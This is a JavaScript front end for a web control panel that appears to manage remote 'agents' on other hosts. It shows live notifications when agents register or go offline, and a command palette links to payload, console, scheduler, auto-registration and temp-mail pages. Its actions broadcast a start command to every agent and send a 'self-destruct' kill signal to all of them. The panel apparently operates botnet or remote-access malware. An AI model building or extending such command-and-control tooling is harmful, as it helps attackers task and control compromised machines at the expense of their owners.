const socket = io();

function _setConn(ok) {
  const dot = document.getElementById('connDot');
  const lbl = document.getElementById('connLabel');
  if (!dot || !lbl) return;
  if (ok) { dot.className = 'conn-dot ok'; lbl.textContent = 'connected'; }
  else { dot.className = 'conn-dot err'; lbl.textContent = 'disconnected'; }
}

socket.on('connect', () => { _setConn(true); });
socket.on('disconnect', () => { _setConn(false); });
socket.on('connect_error', () => { _setConn(false); });

socket.on('agent_update', data => {
  if (data.action === 'register') {
    showNotification(`New agent: ${data.hostname || data.id?.slice(0, 8)}`, 'green');
  } else if (data.action === 'offline') {
    showNotification(`Agent offline: ${data.hostname || data.id?.slice(0, 8)}`, 'red');
  }
});

socket.on('task_result', data => {});

let _notifStack = 0;
function showNotification(msg, type = 'accent') {
  const colors = {
    accent: { bg: 'rgba(0,212,255,.12)', border: '#00d4ff', color: '#00d4ff' },
    green:  { bg: 'rgba(0,255,136,.12)', border: '#00ff88', color: '#00ff88' },
    red:    { bg: 'rgba(255,68,102,.12)', border: '#ff4466', color: '#ff4466' },
    yellow: { bg: 'rgba(255,208,0,.12)', border: '#ffd000', color: '#ffd000' },
    purple: { bg: 'rgba(167,139,250,.12)', border: '#a78bfa', color: '#a78bfa' },
  };
  const c = colors[type] || colors.accent;
  const n = document.createElement('div');
  const offset = 20 + _notifStack * 60;
  n.style.cssText = `position:fixed;top:${offset}px;right:20px;background:${c.bg};border:1px solid ${c.border};color:${c.color};padding:14px 22px;border-radius:10px;font-size:13px;font-weight:500;z-index:9999;backdrop-filter:blur(12px);box-shadow:0 8px 32px rgba(0,0,0,.4);animation:fadeIn .25s ease-out;font-family:Inter,sans-serif;max-width:360px;word-break:break-word`;
  n.textContent = msg;
  document.body.appendChild(n);
  _notifStack++;
  setTimeout(() => {
    n.style.transition = 'all .3s ease-out';
    n.style.opacity = '0';
    n.style.transform = 'translateX(20px)';
    _notifStack = Math.max(0, _notifStack - 1);
    setTimeout(() => n.remove(), 300);
  }, 4000);
}

document.addEventListener('keydown', e => {
  if (e.key === 'Escape') {
    document.querySelectorAll('.modal-overlay.active').forEach(m => m.classList.remove('active'));
    const cp = document.getElementById('cmdPalette');
    if (cp) cp.style.display = 'none';
  }
  if (e.ctrlKey && e.key === 'k') {
    e.preventDefault();
    toggleCommandPalette();
  }
});

let _cpIdx = 0;
function _cpHighlight(items) {
  items.forEach((el, i) => {
    el.style.background = i === _cpIdx ? 'var(--accent-glow)' : '';
    el.style.color = i === _cpIdx ? 'var(--accent)' : 'var(--text)';
    if (i === _cpIdx) el.scrollIntoView({ block: 'nearest' });
  });
}

function toggleCommandPalette() {
  let cp = document.getElementById('cmdPalette');
  if (!cp) {
    cp = document.createElement('div');
    cp.id = 'cmdPalette';
    cp.style.cssText = 'display:none;position:fixed;inset:0;background:rgba(0,0,0,.6);z-index:10000;backdrop-filter:blur(6px);align-items:flex-start;justify-content:center;padding-top:20vh';
    cp.innerHTML = `
      <div style="background:var(--bg-card);border:1px solid var(--border);border-radius:14px;width:520px;max-width:90vw;box-shadow:0 16px 64px rgba(0,0,0,.5);overflow:hidden">
        <input id="cpInput" type="text" placeholder="Type a command..." style="width:100%;background:transparent;border:none;border-bottom:1px solid var(--border);padding:16px 20px;font-size:15px;color:var(--text-bright);font-family:var(--font-mono);outline:none">
        <div id="cpResults" style="max-height:320px;overflow-y:auto;padding:8px 0"></div>
      </div>`;
    cp.addEventListener('click', e => { if (e.target === cp) cp.style.display = 'none'; });
    document.body.appendChild(cp);

    const input = cp.querySelector('#cpInput');
    input.addEventListener('input', () => { _cpIdx = 0; renderPaletteResults(input.value); });
    input.addEventListener('keydown', e => {
      const items = cp.querySelectorAll('.cp-item');
      if (e.key === 'ArrowDown') { e.preventDefault(); _cpIdx = Math.min(_cpIdx + 1, items.length - 1); _cpHighlight(items); }
      else if (e.key === 'ArrowUp') { e.preventDefault(); _cpIdx = Math.max(_cpIdx - 1, 0); _cpHighlight(items); }
      else if (e.key === 'Enter') { e.preventDefault(); if (items[_cpIdx]) items[_cpIdx].click(); }
    });
  }
  if (cp.style.display === 'none' || cp.style.display === '') {
    cp.style.display = 'flex';
    cp.querySelector('#cpInput').value = '';
    cp.querySelector('#cpInput').focus();
    renderPaletteResults('');
  } else {
    cp.style.display = 'none';
  }
}

const PALETTE_COMMANDS = [
  { label: 'Dashboard', icon: '📊', action: () => location.href = '/' },
  { label: 'Devices', icon: '💻', action: () => location.href = '/devices' },
  { label: 'Console', icon: '⌨️', action: () => location.href = '/console' },
  { label: 'Payloads', icon: '📦', action: () => location.href = '/payloads' },
  { label: 'Scheduler', icon: '⏰', action: () => location.href = '/scheduler' },
  { label: 'Auto-Reg', icon: '👤', action: () => location.href = '/autoreg' },
  { label: 'Temp Mail', icon: '📧', action: () => location.href = '/tempmail' },
  { label: 'Logs', icon: '📋', action: () => location.href = '/logs' },
  { label: 'Settings', icon: '⚙️', action: () => location.href = '/settings' },
  { label: 'Export Agents CSV', icon: '📁', action: () => location.href = '/api/export/agents' },
  { label: 'Export Logs CSV', icon: '📁', action: () => location.href = '/api/export/logs' },
  { label: 'Broadcast :start', icon: '🚀', action: () => { fetch('/api/task/broadcast',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'cmd',payload:':start',target:'all'})}).then(r=>r.json()).then(d=>showNotification(`Deployed to ${d.count} agents`,'green')); }},
  { label: 'Kill All Agents', icon: '💀', action: () => { if(confirm('KILL ALL AGENTS?')) fetch('/api/task/broadcast',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'kill',payload:'self-destruct',target:'all'})}).then(()=>showNotification('Kill signal sent','red')); }},
  { label: 'Refresh Stats', icon: '🔄', action: () => location.reload() },
  { label: 'Logout', icon: '🚪', action: () => location.href = '/logout' },
];

function renderPaletteResults(query) {
  const container = document.getElementById('cpResults');
  const q = query.toLowerCase();
  const filtered = q ? PALETTE_COMMANDS.filter(c => c.label.toLowerCase().includes(q)) : PALETTE_COMMANDS;
  container.innerHTML = filtered.map((c, i) =>
    `<div class="cp-item" data-idx="${i}" style="padding:10px 20px;cursor:pointer;display:flex;align-items:center;gap:12px;transition:background .15s;font-size:14px;color:var(--text)" onmouseenter="this.style.background='var(--accent-glow)';this.style.color='var(--accent)'" onmouseleave="this.style.background='';this.style.color='var(--text)'" onclick="PALETTE_COMMANDS.find(c=>c.label==='${c.label.replace(/'/g,"\\'")}').action();document.getElementById('cmdPalette').style.display='none'">
      <span style="font-size:16px">${c.icon}</span>
      <span style="font-weight:500">${c.label}</span>
    </div>`
  ).join('');
}
